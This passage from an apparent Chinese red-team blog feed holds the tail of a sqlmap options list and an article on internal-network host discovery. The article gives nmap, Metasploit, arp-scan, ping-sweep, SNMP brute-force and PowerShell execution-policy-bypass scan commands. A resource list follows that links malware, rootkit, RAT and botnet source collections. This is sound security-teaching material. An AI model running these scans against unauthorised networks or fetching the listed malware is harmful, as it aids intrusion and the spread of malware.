使用正则表达式从提供的代理日志中过滤目标</span><br><span class="line"></span><br><span class="line">--test-filter=TE.. ## 根据有效负载和/或标题(e.g. ROW)选择测试</span><br><span class="line"></span><br><span class="line">--test-skip=TEST.. ## 根据有效负载和/或标题跳过测试（e.g. BENCHMARK）</span><br><span class="line"></span><br><span class="line">--update  ## 更新SqlMap</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x0D-杂项"><a href="#0x0D-杂项" class="headerlink" title="0x0D 杂项"></a>0x0D 杂项</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Miscellaneous（杂项）:</span><br><span class="line"></span><br><span class="line">-z ## 使用简短的助记符 (如 &quot;flu,bat,ban,tec=EU&quot;)</span><br><span class="line"></span><br><span class="line">--alert=ALERT ## 在找到SQL注入时运行主机操作系统命令</span><br><span class="line"></span><br><span class="line">--answers=ANSWERS ## 设置问题答案</span><br><span class="line"></span><br><span class="line">--beep ## 发现SQL 注入时提醒</span><br><span class="line"></span><br><span class="line">--cleanup ## 具体的UDF和表清理DBMS</span><br><span class="line"></span><br><span class="line">--dependencies ## 检查是否缺少（非内核）sqlmap依赖关系</span><br><span class="line"></span><br><span class="line">--disable-coloring ## 禁用控制台输出颜色</span><br><span class="line"></span><br><span class="line">--gpage=GOOGLEPAGE ## 使用Google dork结果指定页码</span><br><span class="line"></span><br><span class="line">--identify-waf ## 对WAF/IPS/IDS保护进行全面测试</span><br><span class="line"></span><br><span class="line">--skip-waf ## 跳过启发式检测WAF/IPS/IDS保护</span><br><span class="line"></span><br><span class="line">--mobile ## 通过HTTP User-Agent标头模仿智能手机</span><br><span class="line"></span><br><span class="line">--offline ## 在离线模式下工作（仅使用会话数据）</span><br><span class="line"></span><br><span class="line">--page-rank  ## Google dork结果显示网页排名（PR）</span><br><span class="line"></span><br><span class="line">--purge-output ## 安全地从输出目录中删除所有内容</span><br><span class="line"></span><br><span class="line">--smart ## 只有在正启发式时才进行彻底测试</span><br><span class="line"></span><br><span class="line">--sqlmap-shell ## 提示交互式 sqlmap shell</span><br><span class="line"></span><br><span class="line">--wizard ## 给初级用户的简单向导界面</span><br></pre></td></tr></table></figure>

<h2 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h2><ul>
<li><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a></li>
</ul>
]]></content>
      <categories>
        <category>红队渗透</category>
      </categories>
      <tags>
        <tag>Tookit</tag>
        <tag>Sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>内网存活主机发现姿势</title>
    <url>/posts/10803/</url>
    <content><![CDATA[<center>本文总结各类内网存活主机发现姿势...</center>

<span id="more"></span>
<hr>
<h2 id="0x01-基于ARP发现内网存活主机"><a href="#0x01-基于ARP发现内网存活主机" class="headerlink" title="0x01 基于ARP发现内网存活主机"></a>0x01 基于ARP发现内网存活主机</h2><p><strong>ARP协议</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">地址解析协议（英文：Address Resolution Protocol，缩写：ARP）是一个通过解析网络层地址来找寻数据链路层地址的网络传输协议，根据IP地址获取物理地址。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址</span><br></pre></td></tr></table></figure>

<h3 id="1-nmap扫描"><a href="#1-nmap扫描" class="headerlink" title="1. nmap扫描"></a>1. nmap扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -sn -PR 192.168.1.1/24</span><br></pre></td></tr></table></figure>

<h3 id="2-msf扫描"><a href="#2-msf扫描" class="headerlink" title="2. msf扫描"></a>2. msf扫描</h3><pre><code>msf &gt; use auxiliary/scanner/discovery/arp_sweep

msf auxiliary(arp_sweep) &gt; set RHOSTS 192.168.1.0/24

msf auxiliary(arp_sweep) &gt; set THREADS 16

msf auxiliary(arp_sweep) &gt; run
</code></pre>
<h3 id="3-arp-scan"><a href="#3-arp-scan" class="headerlink" title="3. arp-scan"></a>3. arp-scan</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ yum -y install arp-scan  //安装</span><br><span class="line"></span><br><span class="line">$ arp-scan --interface=eth0 --localnet  //发现本地网络上所有主机</span><br></pre></td></tr></table></figure>

<h3 id="4-powershell"><a href="#4-powershell" class="headerlink" title="4. powershell"></a>4. powershell</h3><pre><code>c:&gt;powershell.exe -exec bypass -Command &quot;Import-Module .\arpscan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24&quot;
</code></pre>
<h3 id="5-netdiscover"><a href="#5-netdiscover" class="headerlink" title="5. netdiscover"></a>5. netdiscover</h3><pre><code>$ netdiscover -r 192.168.1.0/24 -i wlan0
</code></pre>
<h2 id="0x02-基于ICMP发现内网存活主机"><a href="#0x02-基于ICMP发现内网存活主机" class="headerlink" title="0x02 基于ICMP发现内网存活主机"></a>0x02 基于ICMP发现内网存活主机</h2><p><strong>ICMP协议</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ICMP（Internet Control Message Protocol）Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用</span><br></pre></td></tr></table></figure>

<h3 id="1-nmap扫描-1"><a href="#1-nmap扫描-1" class="headerlink" title="1. nmap扫描"></a>1. nmap扫描</h3><pre><code>$ nmap -sP -PI -T4 192.168.0.1/24
</code></pre>
<h3 id="2-ping"><a href="#2-ping" class="headerlink" title="2. ping"></a>2. ping</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) Windows扫描</span><br><span class="line">for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1|findstr /i &quot;ttl=&quot;</span><br><span class="line"></span><br><span class="line">2）Linux扫描</span><br><span class="line">for i in $( seq 1 255);do ping -c 1 192.168.0.$i|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#x27;&#123;print $4&#125;&#x27;; done</span><br></pre></td></tr></table></figure>

<h3 id="3-fping"><a href="#3-fping" class="headerlink" title="3. fping"></a>3. fping</h3><p><strong>常用参数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a：只显示存活主机；</span><br><span class="line"></span><br><span class="line">-u：只显示不存活主机；</span><br><span class="line"></span><br><span class="line">-l：循环ping</span><br><span class="line"></span><br><span class="line">-g：指定扫描范围</span><br><span class="line"></span><br><span class="line">-f：扫描IP列表文件</span><br></pre></td></tr></table></figure>

<p><strong>扫描实战</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ fping -af iplist  //从文件中扫描存活主机</span><br><span class="line"></span><br><span class="line">$ fping -g IP1 IP2 //IP1地址开始范围，IP2地址结束范围</span><br></pre></td></tr></table></figure>

<h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe ‐exec bypass ‐Command &quot;Import‐Module ./Invoke‐TSPingSweep.ps1</span><br><span class="line">; Invoke‐TSPingSweep ‐StartAddress 192.168.1.1 ‐EndAddress 192.168.1.254 ‐Resolv</span><br><span class="line">eHost ‐ScanPort ‐Port 445,135&quot;</span><br></pre></td></tr></table></figure>

<h3 id="tcping"><a href="#tcping" class="headerlink" title="tcping"></a>tcping</h3><pre><code>tcping.exe ‐n 1 192.168.1.0 80
</code></pre>
<h2 id="0x03-基于UDP发现内网存活主机"><a href="#0x03-基于UDP发现内网存活主机" class="headerlink" title="0x03 基于UDP发现内网存活主机"></a>0x03 基于UDP发现内网存活主机</h2><p><strong>UDP协议</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户数据报协议（英语：User Datagram Protocol，缩写：UDP；又称用户数据包协议）是一个简单的面向数据报的通信协议，位于OSI模型的传输层；UDP报文没有可靠性保证、顺序保证和流量控制字段等，可靠性较差，但在数据传输过程中延迟小、数据传输效率高，适合对可靠性要求不高的应用程序</span><br></pre></td></tr></table></figure>

<h3 id="1-msf扫描"><a href="#1-msf扫描" class="headerlink" title="1. msf扫描"></a>1. msf扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_sweep</span><br></pre></td></tr></table></figure>

<h3 id="2-unicornscan"><a href="#2-unicornscan" class="headerlink" title="2. unicornscan"></a>2. unicornscan</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ unicornscan -mU 192.168.1.1</span><br></pre></td></tr></table></figure>

<h3 id="3-nmap"><a href="#3-nmap" class="headerlink" title="3. nmap"></a>3. nmap</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -sU -T5 -sV --max-retries 1 192.168.1.1 -p 500</span><br></pre></td></tr></table></figure>

<h2 id="0x04-基于snmp发现内网存活主机"><a href="#0x04-基于snmp发现内网存活主机" class="headerlink" title="0x04 基于snmp发现内网存活主机"></a>0x04 基于snmp发现内网存活主机</h2><p><strong>SNMP协议</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SNMP是一种简单网络管理协议，它属于TCP/IP五层协议中的应用层协议，用于网络管理的协议。SNMP主要用于网络设备的管理。SNMP协议主要由两大部分构成：SNMP管理站和SNMP代理。SNMP管理站是一个中心节点，负责收集维护各个SNMP元素的信息，并对这些信息进行处理，最后反馈给网络管理员；而SNMP代理是运行在各个被管理的网络节点之上，负责统计该节点的各项信息，并且负责与SNMP管理站交互，接收并执行管理站的命令，上传各种本地的网络信息</span><br></pre></td></tr></table></figure>

<h3 id="1-nmap扫描-2"><a href="#1-nmap扫描-2" class="headerlink" title="1. nmap扫描"></a>1. nmap扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -sU --script snmp-brute 192.168.1.0/24 -T4</span><br></pre></td></tr></table></figure>

<h3 id="2-msf扫描-1"><a href="#2-msf扫描-1" class="headerlink" title="2. msf扫描"></a>2. msf扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_enum</span><br></pre></td></tr></table></figure>

<h2 id="0x05-基于netbios发现内网存活主机"><a href="#0x05-基于netbios发现内网存活主机" class="headerlink" title="0x05 基于netbios发现内网存活主机"></a>0x05 基于netbios发现内网存活主机</h2><p><strong>netbios协议</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">该协议是一种在局域网上的程序可以使用的应用程序编程接口（API），为程序提供了请求低级服务的同一的命令集，作用是为了给局域网提供网络以及其他特殊功能；系统可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名-特指基于NETBIOS协议获得计算机名称——解析为相应IP地址，实现信息通讯，所以在局域网内部使用NetBIOS协议可以方便地实现消息通信及资源的共享</span><br></pre></td></tr></table></figure>

<h3 id="1-nmap扫描-3"><a href="#1-nmap扫描-3" class="headerlink" title="1. nmap扫描"></a>1. nmap扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -sU --script nbstat.nse -p137 192.168.1.0/24 -T4</span><br></pre></td></tr></table></figure>

<h3 id="2-msf扫描-2"><a href="#2-msf扫描-2" class="headerlink" title="2. msf扫描"></a>2. msf扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/netbios/nbname</span><br></pre></td></tr></table></figure>

<h3 id="3-nbtscan扫描"><a href="#3-nbtscan扫描" class="headerlink" title="3. nbtscan扫描"></a>3. nbtscan扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nbtscan -r 192.168.1.0/24</span><br><span class="line"></span><br><span class="line">$ nbtscan -v -s: 192.168.1.0/24</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>红队渗透</category>
      </categories>
      <tags>
        <tag>Discovery</tag>
      </tags>
  </entry>
  <entry>
    <title>恶意软件分析资源</title>
    <url>/posts/12996/</url>
    <content><![CDATA[<center>本文汇总恶意软件分析中样本来源、分析工具、技术网站等资源...</center>

<span id="more"></span>

<h2 id="0x01-样本来源"><a href="#0x01-样本来源" class="headerlink" title="0x01 样本来源"></a>0x01 样本来源</h2><h3 id="1-下载网站"><a href="#1-下载网站" class="headerlink" title="1. 下载网站"></a>1. 下载网站</h3><ul>
<li><a href="https://s.threatbook.cn/">https://s.threatbook.cn/</a> 微步云沙箱</li>
<li><a href="https://www.virustotal.com/">https://www.virustotal.com/</a> 在线样本获取</li>
<li><a href="https://app.any.run/">https://app.any.run/</a> 在线样本分析</li>
<li><a href="https://bazaar.abuse.ch/browse/">https://bazaar.abuse.ch/browse/</a>  MalwareBazaar Database</li>
<li><a href="https://vx-underground.org/samples.html">https://vx-underground.org/samples.html</a> 恶意软件在线下载</li>
<li><a href="https://github.com/ytisf/theZoo">https://github.com/ytisf/theZoo</a>  恶意软件分析开源项目</li>
<li><a href="https://objective-see.com/malware.html">https://objective-see.com/malware.html</a> MacOS恶意软件样本</li>
<li><a href="http://contagiodump.blogspot.com/">http://contagiodump.blogspot.com/</a> Contagio恶意软件收集平台</li>
<li><a href="https://www.hybrid-analysis.com/">https://www.hybrid-analysis.com/</a>  Payload Security恶意软件分析</li>
<li><a href="http://vxvault.net/ViriList.php">http://vxvault.net/ViriList.php</a>  该网站为恶意软件和urls的收集</li>
</ul>
<h3 id="2-分类样本"><a href="#2-分类样本" class="headerlink" title="2. 分类样本"></a>2. 分类样本</h3><ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a>  Payloads合集</li>
<li><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a>  Exploit 和 shellcode 样本</li>
<li><a href="https://docs.google.com/spreadsheets/d/1TWS238xacAto-fLKh1n5uTsdijWdCEsGIM0Y0Hvmc5g/pubhtml">https://docs.google.com/spreadsheets/</a> 勒索软件列表</li>
<li><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a>  Webshell资源</li>
<li><a href="https://github.com/milabs/awesome-linux-rootkits">https://github.com/milabs/awesome-linux-rootkits</a> Linux rootkit合集</li>
<li><a href="https://github.com/d30sa1/RootKits-List-Download">https://github.com/d30sa1/RootKits-List-Download</a>  Rootkit下载列表</li>
<li><a href="https://github.com/alphaSeclab/awesome-rat">https://github.com/alphaSeclab/awesome-rat</a>  远控木马合集</li>
<li><a href="https://github.com/maestron/botnets">https://github.com/maestron/botnets</a> Botnet源码合集</li>
</ul>
<h3 id="3-样本合集"><a href="#3-样本合集" class="headerlink" title="3. 样本合集"></a>3. 样本合集</h3><ul>
<li><a href="https://github.com/vxunderground/MalwareSourceCode">https://github.com/vxunderground/MalwareSourceCode</a>  不同平台不同语言恶意软件源码</li>
<li><a href="https://github.com/InQuest/malware-samples">https://github.com/InQuest/malware-samples</a> 恶意软件样本与分析文章集合</li>
<li><a href="https://github.com/RamadhanAmizudin/malware">https://github.com/RamadhanAmizudin/malware</a> Malwaretech恶意样本集</li>
<li><a href="https://github.com/mstfknn/malware-sample-library">https://github.com/mstfknn/malware-sample-library</a> 恶意软件样本库</li>
<li><a href="https://github.com/ashishb/android-malware">https://github.com/ashishb/android-malware</a> Andorid恶意样本库</li>
</ul>
<h2 id="0x02-分析工具"><a href="#0x02-分析工具" class="headerlink" title="0x02 分析工具"></a>0x02 分析工具</h2><h3 id="1-Linux平台"><a href="#1-Linux平台" class="headerlink" title="1. Linux平台"></a>1. Linux平台</h3><h4 id="a-静态分析"><a href="#a-静态分析" class="headerlink" title="a. 静态分析"></a>a. 静态分析</h4><ul>
<li><a href="https://linux.die.net/man/1/file">file</a> – 显示文件的类型</li>
<li><a href="https://linux.die.net/man/1/strings">strings</a>– 从文件中提取字符串</li>
<li><a href="http://man7.org/linux/man-pages/man1/diff.1.html">diff</a> – 区分文件</li>
<li><a href="https://linux.die.net/man/1/nm">nm</a> – 提取符号表（函数导入、导出）</li>
<li><a href="https://linux.die.net/man/1/strace">strace</a> – 跟踪系统调用和信号</li>
<li><a href="http://ntinfo.biz/index.html">DiE</a> – 封隔器标识符（推荐）</li>
</ul>
<h4 id="b-动态分析"><a href="#b-动态分析" class="headerlink" title="b. 动态分析"></a>b. 动态分析</h4><ul>
<li><a href="https://www.wireshark.org/download.html">Wireshark</a> – 网络分析工具</li>
<li><a href="https://linux.die.net/man/8/tcpdump">tcpdump</a>  – 网络分析工具</li>
<li><a href="https://github.com/mitmproxy/mitmproxy">MiTMProxy</a> –一个交互式 SSL&#x2F;TLS 拦截 HTTP 代理</li>
<li><a href="https://www.netresec.com/?page=Blog&month=2014-02&post=HowTo-install-NetworkMiner-in-Ubuntu-Fedora-and-Arch-Linux">NetworkMiner</a> – 嗅探器和 PCAP 解析器</li>
<li><a href="https://portswigger.net/burp/communitydownload">Burp Suite</a> – 适用于任何浏览器、系统或平台的免费网络代理</li>
<li><a href="https://www.inetsim.org/packages.html">INetSim</a> – 互联网服务模拟套件</li>
</ul>
<p>适用于 Linux 的 Procmon</p>
<h4 id="c-逆向工具"><a href="#c-逆向工具" class="headerlink" title="c. 逆向工具"></a>c. 逆向工具</h4><ul>
<li><a href="https://linux.die.net/man/1/gdb">GDB</a> – GNU 调试器</li>
<li><a href="https://www.hex-rays.com/products/ida/support/download.shtml">IDA Free&#x2F;Pro</a> – 反汇编器和调试器</li>
<li><a href="https://www.hopperapp.com/">Hopper</a> – 反汇编器和调试器</li>
<li><a href="https://rada.re/r/">radare2</a> - 免费和开源的反汇编器和调试器</li>
<li><a href="https://github.com/radareorg/cutter">Cutter</a> -radare2 的 GUI</li>
<li><a href="https://binary.ninja/">Binary Ninja</a> – 一种新型的逆向平台</li>
<li><a href="https://github.com/angr/angr">angr</a> – 跨平台二进制分析框架</li>
</ul>
<h4 id="d-脱壳反混淆"><a href="#d-脱壳反混淆" class="headerlink" title="d. 脱壳反混淆"></a>d. 脱壳反混淆</h4><ul>
<li><a href="https://github.com/fireeye/flare-floss">FLOSS</a> – 自动从恶意软件中提取混淆的字符串</li>
<li><a href="https://github.com/hiddenillusion/NoMoreXOR">NoMoreXor</a> – 通过使用频率分析帮助猜测文件 256 字节 XOR 密钥的工具</li>
<li><a href="https://blog.didierstevens.com/programs/xorsearch/">XorSearch</a> -用于在 XOR、ROL、ROT 或 SHIFT 编码的二进制文件中搜索给定字符串</li>
</ul>
<h4 id="e-取证工具"><a href="#e-取证工具" class="headerlink" title="e. 取证工具"></a>e. 取证工具</h4><ul>
<li><a href="http://man7.org/linux/man-pages/man1/dd.1.html">dd</a> – 硬盘取证获取工具</li>
<li><a href="http://www.sleuthkit.org/autopsy/download.php">Autopsy</a> - 硬盘取证分析工具</li>
<li><a href="https://github.com/504ensicsLabs/LiME">LiME</a> – 内存获取工具</li>
<li><a href="https://github.com/volatilityfoundation/volatility">Volatility</a> – 内存取证分析框架</li>
<li><a href="https://fogproject.org/">FOG</a> — 免费的开源网络计算机克隆和管理解决方案</li>
</ul>
<h4 id="f-综合工具"><a href="#f-综合工具" class="headerlink" title="f. 综合工具"></a>f. 综合工具</h4><ul>
<li><a href="https://github.com/monnappa22/Limon">Limon Sandbox</a> – 免费开源的自动化 Linux 恶意软件分析沙箱</li>
<li><a href="https://cuckoosandbox.org/">Cuckoo Sandbox</a> – 免费开源的自动化恶意软件分析沙箱</li>
</ul>
<h3 id="2-Windwos平台"><a href="#2-Windwos平台" class="headerlink" title="2. Windwos平台"></a>2. Windwos平台</h3><h4 id="a-静态分析-1"><a href="#a-静态分析-1" class="headerlink" title="a. 静态分析"></a>a. 静态分析</h4><ul>
<li><a href="https://mh-nexus.de/en/downloads.php?product=HxD20">HxD</a> – 十六进制查看器和编辑器</li>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/">strings</a> – 从文件中提取字符串</li>
<li><a href="https://www.nirsoft.net/utils/hash_my_files.html">HashMyFiles</a> – 计算文件的 MD5&#x2F;SHA1&#x2F;CRC32 哈希值</li>
<li><a href="http://ntinfo.biz/index.html">DiE</a> – 封隔器标识符</li>
<li><a href="https://www.aldeid.com/wiki/PEiD">PEiD</a> – 封隔器标识符</li>
<li><a href="https://www.winitor.com/">PeStudio</a> – 高级 PE 查看器等</li>
<li><a href="https://ntcore.com/?page_id=388">CFF Explorer</a> – PE 编辑器</li>
<li><a href="http://www.angusj.com/resourcehacker/">Resource Hacker</a> – 资源编辑器</li>
<li><a href="https://blog.didierstevens.com/programs/oledump-py/">oledump.py</a> – OLE 文件分析器</li>
<li><a href="http://www.reconstructer.org/">OfficeMalScanner</a> – Office 文件恶意软件扫描程序</li>
<li><a href="https://blog.didierstevens.com/2009/03/31/pdfid/">PDFiD</a> – PDF 字符串扫描仪和标识符</li>
<li><a href="http://sandsprite.com/blogs/index.php?uid=7&pid=57">PDFStreamDumper</a> – PDF 恶意文件扫描程序</li>
<li><a href="https://github.com/smalot/pdfparser">PDFParser</a> – PDF 文件数据提取器</li>
</ul>
<h4 id="b-动态分析-1"><a href="#b-动态分析-1" class="headerlink" title="b. 动态分析"></a>b. 动态分析</h4><ul>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/">Process Explorer</a> - 高级任务管理器</li>
<li><a href="https://processhacker.sourceforge.io/downloads.php">Process Hacker</a> - 高级任务管理器</li>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/">Process Monitor</a> – 监控系统进程事件（文件系统、注册表、网络）</li>
<li><a href="https://sourceforge.net/projects/regshot/">Regshot</a> – 注册表比较程序</li>
<li><a href="http://www.rohitab.com/downloads">API Monitor</a> – 监视 Windows API 函数（内存转储、断点等）</li>
<li><a href="https://github.com/hasherezade/pe-sieve">PE-Sieve</a> – 扫描恶意植入（替换&#x2F;注入 PE、shellcode、钩子、内存补丁）</li>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/">TCPView</a> – 显示网络连接</li>
<li><a href="https://www.telerik.com/fiddler">Fiddler</a> – 适用于任何浏览器、系统或平台的免费Web调试代理</li>
<li><a href="https://github.com/fireeye/flare-fakenet-ng">FakeNet-NG</a> – 模拟服务&#x2F;开放端口以进行恶意软件行为分析</li>
<li><a href="https://www.inetsim.org/downloads.html">INetSim</a> – 模拟服务&#x2F;开放端口以进行恶意软件行为分析</li>
<li><a href="https://www.fireeye.com/services/freeware/apatedns.html">ApateDNS</a> – 控制 DNS 响应</li>
<li><a href="https://github.com/mitmproxy/mitmproxy">MiTMProxy</a> – 一个交互式 SSL&#x2F;TLS 拦截 HTTP 代理（非常适合 HTTPS 检查）</li>
<li><a href="https://www.netresec.com/index.ashx?page=NetworkMiner">NetworkMiner</a> – 嗅探器和 PCAP 解析器</li>
<li><a href="https://www.procdot.com/">ProcDot</a> – 一种新的可视化恶意软件分析工具</li>
<li><a href="https://www.phrozen.io/docs/windows/projects/freeware/winja/">WinJa</a> – 一个轻量级但功能强大的工具，用于发现隐藏在您系统中的恶意软件</li>
<li><a href="https://www.kahusecurity.com/tools.html">CMD Watcher</a> – 监视 CMD、PowerShell 和其他进程，暂停它，提取命令行数据，然后有选择地杀死它</li>
</ul>
<h4 id="c-逆向工具-1"><a href="#c-逆向工具-1" class="headerlink" title="c. 逆向工具"></a>c. 逆向工具</h4><ul>
<li><a href="https://x64dbg.com/">x64dbg</a> – 用户模式调试器</li>
<li><a href="http://www.ollydbg.de/version2.html">OllyDbg</a> – 用户模式调试器</li>
<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools">WinDbg</a> – 内核模式调试器</li>
<li><a href="https://github.com/SinaKarvandi/windbg2ida">WinDBG2IDA</a> — 显示 IDA 中的 WinDBG 步骤</li>
<li><a href="https://github.com/avast/retdec">RetDec</a> – 基于 LLVM 的可重定向机器代码反编译器</li>
<li><a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a> – NSA 软件逆向工程框架</li>
</ul>
<h4 id="d-脱壳反混淆-1"><a href="#d-脱壳反混淆-1" class="headerlink" title="d. 脱壳反混淆"></a>d. 脱壳反混淆</h4><ul>
<li><a href="https://github.com/hiddenillusion/NoMoreXOR">NoMoreXor</a> – 通过使用频率分析帮助猜测文件 256 字节 XOR 密钥的工具</li>
<li><a href="https://github.com/BromiumLabs/PackerAttacker">PackerAttacker</a> – 使用内存和代码挂钩来检测加壳程序的 C++ 应用程序</li>
<li><a href="https://github.com/unipacker/unipacker">UniPacker</a> – 基于仿真的 Windows 二进制文件的自动和平台独立解包器</li>
<li><a href="https://github.com/malwaremusings/unpacker/">unpacker</a> - WinAppDbg脚本来自动执行恶意拆包</li>
</ul>
<h4 id="e-加壳工具"><a href="#e-加壳工具" class="headerlink" title="e. 加壳工具"></a>e. 加壳工具</h4><ul>
<li><a href="https://upx.github.io/">UPX</a> – Windows PE Packer</li>
<li><a href="https://www.alternate-tools.com/pages/c_exepacker.php?lang=ENG">Alterante EXE Packer</a> – 基于 UPX打包程序</li>
<li><a href="https://enigmaprotector.com/">Enigma Protector</a> – 用于许可和保护Windows 可执行文件的专业系统</li>
<li><a href="https://www.webtoolmaster.com/exestealth.htm">ExeStealth</a> – Delphi、Visual Basic 和 C++ PE打包程序</li>
<li><a href="https://www.oreans.com/Themida.php">Themida</a> - 高级Windows 软件保护系统</li>
<li><a href="https://vmpsoft.com/">VMProtect</a> – VMProtect 通过在具有非标准架构的虚拟机上执行代码来保护代码</li>
</ul>
<h4 id="f-取证工具"><a href="#f-取证工具" class="headerlink" title="f. 取证工具"></a>f. 取证工具</h4><ul>
<li><a href="https://winpmem.velocidex.com/">WinPmem</a> – 内存取证获取工具</li>
<li><a href="https://blog.comae.io/your-favorite-memory-toolkit-is-back-f97072d33d5c">DumpIt</a> – 内存取证获取工具</li>
<li><a href="https://accessdata.com/product-download/ftk-imager-version-4-2-0">FTK Imager</a> – 硬盘和内存取证获取工具</li>
<li><a href="https://github.com/google/rekall">Rekall</a> – 内存取证框架</li>
<li><a href="https://www.fireeye.com/services/freeware/redline.html">Readline</a> - 内存取证分析工具</li>
</ul>
<h4 id="g-综合工具"><a href="#g-综合工具" class="headerlink" title="g. 综合工具"></a>g. 综合工具</h4><ul>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/">Sysinternals Suite</a> – Microsoft 用于分析 Windows 系统内部的工具</li>
<li><a href="https://github.com/fireeye/flare-vm">Flare-VM</a> – 基于 Windows 的恶意软件分析安全工具</li>
</ul>
<h3 id="3-MacOS平台"><a href="#3-MacOS平台" class="headerlink" title="3. MacOS平台"></a>3. MacOS平台</h3><h4 id="a-静态分析-2"><a href="#a-静态分析-2" class="headerlink" title="a. 静态分析"></a>a. 静态分析</h4><ul>
<li><a href="https://www.unix.com/man-page/osx/1/codesign/">codesign</a>  – 提取代码签名认证状态等</li>
<li><a href="https://www.unix.com/man-page/osx/8/spctl/">spctl</a> – 检查文件的认证是否被撤销等等</li>
<li><a href="https://www.unix.com/man-page/osx/1/xattr/">xattr</a> – 检查属性文件是否包含以及包含哪些属性（例如 GateKeeper 检查的隔离标志）</li>
<li><a href="https://www.unix.com/man-page/osx/1/otool/">otool</a> – 检查二进制文件、提取汇编指令、查看段、节等</li>
<li><a href="http://www.newosxbook.com/tools/jtool.html">JTool</a> – otool的升级本工具</li>
<li><a href="https://objective-see.com/products.html">What’s your Sign</a> – 检查代码签名认证状态，显示哈希值等</li>
</ul>
<h4 id="b-动态分析-2"><a href="#b-动态分析-2" class="headerlink" title="b. 动态分析"></a>b. 动态分析</h4><ul>
<li><a href="https://objective-see.com/products/utilities.html#ProcessMonitor">ProcessMonitor</a> – 监控流程活动</li>
<li><a href="https://objective-see.com/products/utilities.html#FileMonitor">FileMonitor</a> – 监控文件系统事件</li>
<li><a href="https://github.com/dpnishant/appmon">AppMon</a> – 基于 Frida 的监控和篡改系统 API 调用的自动化框架</li>
<li><a href="https://fsmonitor.com/">FSMonitor</a> – 监控文件系统事件（读、写等）</li>
<li><a href="https://objective-see.com/products.html">Netiquette</a> – 监控网络连接</li>
<li><a href="https://objective-see.com/products.html">LuLu</a> – 检查网络可疑活动并显示</li>
<li><a href="https://objective-see.com/products.html">TaskExplorer</a> –虚拟探索所有正在运行的进程</li>
<li><a href="https://objective-see.com/products.html">ReiKey</a> – 动态拦截和检测键盘记录活动</li>
<li><a href="https://objective-see.com/products.html">BlockBlock</a> – 动态拦截系统上的持久操作</li>
</ul>
<h4 id="c-逆向工具-2"><a href="#c-逆向工具-2" class="headerlink" title="c. 逆向工具"></a>c. 逆向工具</h4><ul>
<li><a href="https://lldb.llvm.org/">LLDB</a> – 类似 GDB 的 macOS 调试器</li>
</ul>
<h4 id="d-打包加壳"><a href="#d-打包加壳" class="headerlink" title="d. 打包加壳"></a>d. 打包加壳</h4><ul>
<li><a href="https://www.pouet.net/prod.php?which=29185">iPakk</a> – MacOSX Mach-O (PPC)打包程序</li>
<li><a href="https://www.pouet.net/prod.php?which=51324">muncho</a> – MacOSX Mach-O（英特尔）打包程序</li>
<li><a href="https://www.pouet.net/prod.php?which=66926">oneKpaq</a> – MacOSX Mach-O (Intel)打包程序</li>
</ul>
<h4 id="e-取证工具-1"><a href="#e-取证工具-1" class="headerlink" title="e. 取证工具"></a>e. 取证工具</h4><ul>
<li><a href="http://macappstore.org/dcfldd/">dcfldd</a> – 硬盘取证获取工具</li>
<li><a href="https://github.com/ydkhatri/mac_apt">mac_apt</a> – 硬盘取证分析工具</li>
